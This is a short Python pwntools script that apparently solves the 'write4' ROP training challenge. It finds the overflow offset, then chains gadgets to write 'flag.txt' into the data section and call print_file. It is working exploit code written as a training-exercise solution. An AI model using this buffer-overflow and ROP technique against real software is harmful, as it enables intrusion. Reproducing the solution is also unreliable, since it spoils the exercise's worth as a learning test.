#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./write4
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "./write4")
context.terminal = ["alacritty", "-e", "sh", "-c"]
context.delete_corefiles = True
rop = ROP(exe)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

io = start()

io.sendline(cyclic(200))
io.wait()
stack = io.corefile.rsp
offset = cyclic_find(io.corefile.read(stack, 4))
info(offset)

io = start()


write_r14_r15 = 0x400628
pop_r14_r15 = rop.find_gadget(["pop r14", "pop r15", "ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
print_file = exe.symbols["print_file"]
data_section = exe.symbols["data_start"]

io = start()

payload = flat(
    b"A" * offset,
    pop_r14_r15,
    data_section,
    "flag.txt",
    write_r14_r15,
    pop_rdi,
    data_section,
    print_file,
    0x0,
)
io.sendline(payload)
io.recvuntil("you!\n")
success(io.recvuntil("}"))
